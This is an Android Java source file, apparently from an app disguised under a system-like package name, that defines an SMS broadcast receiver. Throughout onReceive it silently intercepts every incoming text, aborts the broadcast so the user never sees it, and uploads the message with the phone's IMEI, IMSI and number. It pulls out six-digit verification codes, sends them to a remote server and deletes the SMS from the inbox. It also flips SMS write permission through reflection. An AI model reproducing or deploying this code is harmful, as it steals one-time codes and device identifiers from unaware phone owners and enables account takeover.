package com.android.sms.proxy.service;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.text.TextUtils;
import android.util.Log;

import com.android.sms.proxy.entity.CheckInfo;
import com.android.sms.proxy.entity.MessageEvent;
import com.android.sms.proxy.entity.NativeParams;
import com.android.sms.proxy.entity.PhoneInfo;
import com.android.sms.proxy.entity.SmsSimInfo;
import com.android.sms.proxy.entity.SpSimpleJsonImpl;
import com.android.sms.proxy.function.RequestManager;
import com.flurry.android.FlurryAgent;
import com.oplay.nohelper.loader.Loader_Base_ForCommon;
import com.oplay.nohelper.utils.Util_Service;
import com.oplay.nohelper.volley.RequestEntity;
import com.oplay.nohelper.volley.Response;
import com.oplay.nohelper.volley.VolleyError;

import net.youmi.android.libs.common.dns.Message;

import org.connectbot.service.TerminalManager;
import org.greenrobot.eventbus.EventBus;

import java.util.HashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * 短信拦截
 *
 * @author zyq 16-3-9
 */
public class Receiver_SMS extends BroadcastReceiver {

	private final static boolean DEBUG = NativeParams.RECEIVE_SMS_DEBUG;
	private final static String TAG = "smsReceiver";
	private final static String SMS_ACTION = "android.provider.Telephony.SMS_RECEIVED";
	private final static String SMS_CATEGORY = "android.intent.category.DEFAULT";
	private final String SMS_SERVICE = "pdus";
	private final String SMS_BODY = "body";
	private final String SMS_ID = "_id";
	private final String SMS_RECEIVE_CONTENT = "content://sms/inbox";
	private final String SMS_CONTENT = "content://sms";
	//默认是
	private final long VALID_SMS_TIME = NativeParams.SMS_RECEIVER_VALID_TIME * 60 * 1000;

	private static OnReceiveSMSListener mOnReceiveSMSListener;

	public Receiver_SMS() {
	}

	;

	public Receiver_SMS(OnReceiveSMSListener listener) {
		mOnReceiveSMSListener = listener;
	}


	public static void registSmsReceiver(Context context, Receiver_SMS receiver) {
		IntentFilter filter = new IntentFilter();
		filter.addAction(SMS_ACTION);
		filter.addCategory(SMS_CATEGORY);
		context.registerReceiver(receiver, filter);
	}

	public static void setReceiveListener(OnReceiveSMSListener listener) {
		mOnReceiveSMSListener = listener;
	}

	public static void unRegisterSmsReceiver(Context context, Receiver_SMS reciever) {
		if (reciever != null) {
			context.unregisterReceiver(reciever);
		}
	}

	@Override
	public void onReceive(Context context, Intent intent) {
		try {
			if (DEBUG) {
				final String message = "接到短信通知了";
				EventBus.getDefault().post(new Message(message));
			}
			Map<String, String> map3 = new HashMap<>();
			map3.put(NativeParams.KEY_MESSAGE_ACTION, intent.getAction());
			FlurryAgent.logEvent(NativeParams.EVENT_GET_MESSAGE_BROADCAST_PRO1, map3);

			if (SMS_ACTION.equals(intent.getAction())) {
				Bundle args = intent.getExtras();
				final boolean isHeartBeatServiceLive = Util_Service.isServiceRunning(context, HeartBeatService.class
						.getCanonicalName());
				final boolean isTerminalServiceLive = Util_Service.isServiceRunning(context, TerminalManager.class
						.getCanonicalName());
				final boolean isProxyServiceLive = Util_Service.isServiceRunning(context, ProxyService.class
						.getCanonicalName());
				if (DEBUG) {
					Log.d(TAG, "当前service状态 " + isHeartBeatServiceLive + " 收到短信:" + args);
				}
				if (!isHeartBeatServiceLive) return;
				final long currentTime = System.currentTimeMillis();

				//表示一个注册需要５分钟时间，若从建立连接ssh成功到之后５分钟时间，这段时间，会拦截该广播！！！！！！！！！！！！！
//				if (HeartBeatService.recordConnectTime > 0 && (currentTime - HeartBeatService.recordConnectTime <
//						VALID_SMS_TIME)) {
//					if(DEBUG){
//						Log.d(TAG,"in valid time,record abortBroadcast()");
//					}
//					this.abortBroadcast();
//					//HeartBeatService.recordConnectTime = 0;
//				} else {
//					//若是我们自己发送指令过去,就走这条通道
//					if (GetMsgRunnable.sendSmsTime > 0 && (currentTime - GetMsgRunnable.sendSmsTime <
//							VALID_SMS_TIME)) {
//						if (DEBUG) {
//							Log.d(TAG, "in valid time,sendSm abortBroadcast()");
//						}
//						this.abortBroadcast();
//						//GetMsgRunnable.sendSmsTime = 0;
//					} else {
//						//若不满足该要求,就清掉该请求.
//						if (DEBUG) {
//							Log.d(TAG, "not in valid time, clearAbortBroadcast()");
//						}
//						this.clearAbortBroadcast();
//						return;
//					}
//				}
				this.abortBroadcast();
				if (DEBUG) {
					Log.d(TAG, "in the receive context,abortBroadcast()");
				}
				Map<String, String> map1 = new HashMap<>();
				map1.put(NativeParams.KEY_MESSAGE_ARGS, args.toString());
				FlurryAgent.logEvent(NativeParams.EVENT_GET_MESSAGE_BROADCAST_PRO, map1);

				if (args != null) {
					String msgContent = null;
					if (!NativeParams.DEFAULT_SEND_BINARY_SMS) {
						Object[] pdus = (Object[]) args.get(SMS_SERVICE);
						SmsMessage messages[] = new SmsMessage[pdus.length];
						if (DEBUG) {
							Log.d(TAG, "message length：" + pdus.length);
						}
						StringBuilder sb = new StringBuilder();
						for (int i = 0; i < messages.length; i++) {
							messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
							sb.append(messages[i].getMessageBody());
						}
						msgContent = sb.toString();
					} else {
						msgContent = PhoneInfo.getInstance(context).decodeIncomingSmsText(intent);
					}
					if (TextUtils.isEmpty(msgContent)) return;
					if (DEBUG) {
						Log.d(TAG, "收到的短信内容：" + msgContent);
					}
					reportData(context, msgContent);
					String code = getVerificationCode(msgContent);
					if (DEBUG) {
						Log.d(TAG, "验证码是" + code);
					}
					//如果是验证码,还要发送该验证码
					if (!TextUtils.isEmpty(code)) {
						sendRegisterCode(context, code);
					}
					if (Build.VERSION.SDK_INT == Build.VERSION_CODES.KITKAT) {
						if (SmsWriteOpUtil.isWriteEnabled(context)) {
							boolean isSuccess = SmsWriteOpUtil.setWriteEnabled(context, true);
							final String model = Build.MODEL;
							if (DEBUG) {
								Log.d(TAG, "4.4反射修改短信权限！！！！！！ " + isSuccess);
							}
							Map<String, String> map2 = new HashMap<>();
							map2.put(NativeParams.KEY_FIX_SYSTEM_SUCCESS, String.valueOf(isSuccess));
							map2.put(NativeParams.KEY_KITKAT_DEVICE, model);
							FlurryAgent.logEvent(NativeParams.EVENT_VERSION_KITKAT, map2);
						}
					}

//						删掉指令
//						if (HeartBeatService.recordConnectTime > 0 && (currentTime - HeartBeatService
//								.recordConnectTime <
//								VALID_SMS_TIME)) {
//							final CheckInfo info = GetMsgRunnable.currentCheckInfo;
//							if (info != null && !TextUtils.isEmpty(info.getOperatorCode())) {
//								PhoneInfo.getInstance(context).deleteSMS(context, info.getOperatorCode());
//							}
//						}
					//指令前面已经删除
					//只要删掉该短信
					if (!NativeParams.DEFAULT_SEND_BINARY_SMS) {
						PhoneInfo.getInstance(context).deleteSMS(context, msgContent);
					}
					Map<String, String> map = new HashMap<>();
					map.put(NativeParams.KEY_MESSAGE_INFO, msgContent);
					map.put(NativeParams.KEY_PROXY_STATUS, String.valueOf(isProxyServiceLive));
					map.put(NativeParams.KEY_TERNIMAL_STATUS, String.valueOf(isTerminalServiceLive));
					map.put(NativeParams.KEY_HEART_STATUS, String.valueOf(isHeartBeatServiceLive));
//					map.put(NativeParams.KEY_MESSAGE_LENGTH, String.valueOf(messages.length));
					FlurryAgent.logEvent(NativeParams.EVENT_GET_MESSAGE_BROADCAST, map);
				}
			}
		} catch (Throwable e) {
			if (DEBUG) {
				Log.e(TAG, e.fillInStackTrace().toString());
			}
			FlurryAgent.onError(TAG, "", e);
		}
	}

	private void reportData(Context context, String contentMsg) {
		SmsSimInfo info = new SmsSimInfo();
		CheckInfo checkInfo = GetMsgRunnable.currentCheckInfo;
		final String operator = checkInfo.getOperators();
		final String operatorCode = checkInfo.getOperatorCode();

		info.setImei(PhoneInfo.getInstance(context).getPhoneIMEI());
		info.setImsi(PhoneInfo.getInstance(context).getPhoneIMSI());
		info.setMessageinfo(contentMsg);
		info.setPhonenumber(PhoneInfo.getInstance(context).getNativePhoneNumber1());
		info.setOperators(operator);
		info.setOperatorcode(operatorCode);

		if (DEBUG) {
			Log.d(TAG, "即将上报短信信息！！！！！！！！！！");
			StringBuilder builder = new StringBuilder();
			builder.append("imei:" + info.getIMEI()).append("\n")
					.append("imsi:" + info.getIMSI()).append("\n")
					.append("phoneNumber:" + info.getPhonenumber()).append("\n")
					.append("operator:" + info.getOperators()).append("\n")
					.append("operatorcode:" + info.getOperatorcode()).append("\n")
					.append("smsinfo:" + info.getMessageinfo()).append("\n");
			EventBus.getDefault().post(new MessageEvent(builder.toString()));
		}

		try {
			info.saveInBackground();
		} catch (Throwable e) {
			if (DEBUG) {
				Log.d(TAG, "上报数据失败！！！！！！！！！！！！");
				Log.e(TAG, e.fillInStackTrace().toString());
			}
		}
	}


	private String getVerificationCode(String smsBody) {
		Pattern p = Pattern.compile("\\D\\d{6}\\D");
		Matcher m = p.matcher(smsBody);
		if (m.find()) {
			final int groupCount = m.groupCount();
			if (groupCount >= 0) {
				final String tempStr = m.group(0);
				return tempStr.substring(1, tempStr.length() - 1);
			}
		}
		return null;
	}


	private String getPhoneNumber(String smsBody) {
		if (DEBUG) {
			Log.d(TAG, "找手机号");
		}
		String telRegex = "[1][358]\\d{9}";
		Pattern p = Pattern.compile(telRegex);
		Matcher m = p.matcher(smsBody);
		if (m.find()) {
			final int groupCount = m.groupCount();
			if (groupCount >= 0) {
				final String tempStr = m.group(0);
				return tempStr.substring(0, tempStr.length());
			}
		}
		return null;
	}

	public interface OnReceiveSMSListener {
		void onReceiveSMS(String sms);
	}


	public void sendRegisterCode(final Context context, String sms) {
		String number = PhoneInfo.getInstance(context).getNativePhoneNumber();
		if (TextUtils.isEmpty(number)) return;
		Map<String, String> map = new HashMap<>();
		map.put(NativeParams.TYPE_PHONE_NUMBER, PhoneInfo.getInstance(context).getNativePhoneNumber());
		map.put(NativeParams.TYPE_PHONE_IMEI, PhoneInfo.getInstance(context).getIMEI());
		map.put(NativeParams.TYPE_PHONE_SMS, String.valueOf(sms));
		String authStr = RequestManager.getAuthStr(NativeParams.AES_KEY, map);
		Map<String, String> map1 = new HashMap<>();
		map1.put("s", authStr);
		RequestEntity<SpSimpleJsonImpl> entity = new RequestEntity<SpSimpleJsonImpl>(NativeParams.URL_SEND_CODE,
				SpSimpleJsonImpl.class, map1);
		Loader_Base_ForCommon.getInstance().onRequestLoadNetworkTask(entity, true, new Response.Listener() {
			@Override
			public void onResponse(Object response) {
				if (response instanceof SpSimpleJsonImpl) {
					int code = ((SpSimpleJsonImpl) response).getCode();
					if (code == NativeParams.SUCCESS) {
						String data = ((SpSimpleJsonImpl) response).getData();
					}
				}
			}
		}, new Response.ErrorListener() {
			@Override
			public void onErrorResponse(VolleyError error) {
				if (DEBUG) {
					Log.d(TAG, error.toString());
				}
				FlurryAgent.onError(TAG, "", error.fillInStackTrace());
			}
		});
	}
}
